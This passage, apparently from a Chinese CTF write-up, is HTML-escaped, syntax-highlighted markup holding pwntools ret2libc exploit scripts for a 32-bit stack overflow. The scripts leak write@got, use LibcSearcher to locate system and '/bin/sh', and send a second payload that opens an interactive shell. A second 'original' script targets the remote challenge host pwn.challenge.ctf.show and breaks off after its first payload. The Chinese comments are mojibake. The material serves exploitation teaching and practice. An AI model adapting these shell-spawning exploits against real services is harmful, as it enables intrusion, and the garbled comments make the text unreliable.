&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è·å–writeå‡½æ•°çš„PLTè¡¨åœ°å€ï¼ˆProcedure Linkage Tableï¼Œç”¨äºé—´æ¥è°ƒç”¨å‡½æ•°ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;write_plt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;plt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ„é€ ç¬¬ä¸€æ¬¡æ”»å‡»çš„payloadï¼ˆæ ˆæº¢å‡ºåˆ©ç”¨ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 1. å¡«å……ç¼“å†²åŒºåˆ°è¿”å›åœ°å€ï¼š0x88æ˜¯ç¼“å†²åŒºå¤§å°ï¼Œ0x4æ˜¯ebpå¯„å­˜å™¨å¤§å°ï¼ˆ32ä½ç¨‹åºï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 2. è¿”å›åœ°å€ï¼šè¦†ç›–ä¸ºwrite@pltï¼ˆè°ƒç”¨writeå‡½æ•°è¾“å‡ºæ•°æ®ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 3. writeæ‰§è¡Œå®Œåè·³è½¬çš„åœ°å€ï¼šmainå‡½æ•°ï¼ˆå›åˆ°ç¨‹åºå¼€å¤´ï¼Œæ–¹ä¾¿ç¬¬äºŒæ¬¡æ”»å‡»ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 4. writeå‡½æ•°çš„å‚æ•°1ï¼šæ–‡ä»¶æè¿°ç¬¦0ï¼ˆé”™è¯¯ï¼åº”ä¸º1ï¼Œstdoutæ ‡å‡†è¾“å‡ºï¼Œå¦åˆ™æ— æ³•æ­£ç¡®æ³„éœ²æ•°æ®ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 5. writeå‡½æ•°çš„å‚æ•°2ï¼šè¦æ³„éœ²çš„åœ°å€ï¼ˆwrite@gotï¼Œå­˜å‚¨writeçš„çœŸå®å†…å­˜åœ°å€ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 6. writeå‡½æ•°çš„å‚æ•°3ï¼šæ³„éœ²çš„å­—èŠ‚æ•°ï¼ˆ4å­—èŠ‚ï¼Œ32ä½åœ°å€é•¿åº¦ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x88&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write_plt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write_got&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å‘é€ç¬¬ä¸€æ¬¡payloadï¼Œè§¦å‘æ ˆæº¢å‡ºï¼Œæ‰§è¡Œwriteå‡½æ•°æ³„éœ²åœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ¥æ”¶æ³„éœ²çš„writeå‡½æ•°çœŸå®åœ°å€ï¼ˆ4å­—èŠ‚ï¼Œ32ä½ï¼‰ï¼Œå¹¶è½¬æ¢ä¸ºæ•´æ•°&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# æ‰“å°æ³„éœ²çš„åœ°å€ï¼ˆåå…­è¿›åˆ¶ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ä½¿ç”¨LibcSearcheræ ¹æ®writeå‡½æ•°åœ°å€æŸ¥æ‰¾å¯¹åº”çš„libcç‰ˆæœ¬&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LibcSearcher&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è®¡ç®—libcçš„åŸºåœ°å€ï¼šlibcåŸºåœ°å€ = æ³„éœ²çš„å‡½æ•°åœ°å€ - è¯¥å‡½æ•°åœ¨libcä¸­çš„åç§»é‡&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;write&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è®¡ç®—systemå‡½æ•°çš„åœ°å€ï¼šsystemåœ°å€ = libcåŸºåœ°å€ + systemåœ¨libcä¸­çš„åç§»é‡&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è®¡ç®—&amp;#34;/bin/sh&amp;#34;å­—ç¬¦ä¸²çš„åœ°å€ï¼šbin_shåœ°å€ = libcåŸºåœ°å€ + å­—ç¬¦ä¸²åœ¨libcä¸­çš„åç§»é‡&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;bin_sh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;str_bin_sh&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ„é€ ç¬¬äºŒæ¬¡æ”»å‡»çš„payloadï¼ˆè·å–shellï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 1. åŒæ ·çš„å¡«å……ï¼šè¦†ç›–ç¼“å†²åŒºå’Œebp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 2. è¿”å›åœ°å€ï¼šè¦†ç›–ä¸ºsystemå‡½æ•°åœ°å€ï¼ˆè°ƒç”¨systemæ‰§è¡Œå‘½ä»¤ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 3. systemæ‰§è¡Œå®Œåè·³è½¬çš„åœ°å€ï¼šmainå‡½æ•°ï¼ˆå¯é€‰ï¼Œä¸å½±å“shellä½¿ç”¨ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 4. systemå‡½æ•°çš„å‚æ•°ï¼š&amp;#34;/bin/sh&amp;#34;å­—ç¬¦ä¸²çš„åœ°å€ï¼ˆæ‰§è¡Œè¯¥å‘½ä»¤è·å–äº¤äº’shellï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x88&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bin_sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å‘é€ç¬¬äºŒæ¬¡payloadï¼Œè§¦å‘æ ˆæº¢å‡ºï¼Œæ‰§è¡Œsystem(&amp;#34;/bin/sh&amp;#34;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è¿›å…¥äº¤äº’æ¨¡å¼ï¼Œä¸è·å–çš„shellè¿›è¡Œäº¤äº’ï¼ˆè¾“å…¥å‘½ä»¤ç­‰ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;åŸç‰ˆexpï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;LibcSearcher&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;i386&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pwn.challenge.ctf.show&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28157&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;main&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;write_plt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;plt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;write_got&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;got&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x88&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write_plt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write_got&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
